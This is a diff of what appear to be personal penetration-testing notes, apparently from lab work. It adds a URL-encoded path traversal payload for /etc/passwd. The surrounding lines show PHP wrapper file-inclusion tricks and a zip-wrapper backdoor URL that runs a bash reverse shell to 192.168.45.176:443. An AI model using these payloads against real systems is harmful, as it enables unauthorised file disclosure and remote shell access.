@@ -518,6 +518,7 @@ Windows Privesc: God Potato(https://github.com/BeichenDream/GodPotato)
   - Can you upload reverse shell through other user?
   - Can you find SSH keys?
   - Did we try using php wrapper??? php://filter/convert.base64-encode/resource=index
+  - /%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
   - http://192.168.173.229/index?file=zip://uploads/upload_1705500922.zip%23rev
   - ## GETTING reverse shell through zipfile...?!
   - http://192.168.173.229/index.php?file=zip://uploads/upload_1708042099.zip%23simple-backdoor&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.176%2F443%200%3E%261%22
